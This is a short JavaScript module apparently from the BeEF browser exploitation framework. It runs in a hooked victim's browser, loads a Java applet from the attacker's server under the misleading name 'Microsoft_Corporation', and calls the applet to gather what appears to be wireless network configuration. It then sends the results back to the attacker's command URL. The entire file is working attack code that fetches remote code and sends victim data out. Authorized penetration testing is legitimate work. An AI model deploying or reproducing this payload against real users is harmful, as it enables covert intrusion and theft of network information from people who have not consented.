/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

beef.execute(function() {
    var applet_archive = 'http://'+beef.net.host+ ':' + beef.net.port + '/wirelessZeroConfig.jar';
    var applet_id = '<%= @applet_id %>';
    var applet_name = '<%= @applet_name %>';
    var output;
    beef.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'wirelessZeroConfig' ,
       	null, applet_archive, null);
    output = document.Microsoft_Corporation.getInfo();
    if (output) {
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+output);
    }
    beef.dom.detachApplet('wirelessZeroConfig');
});


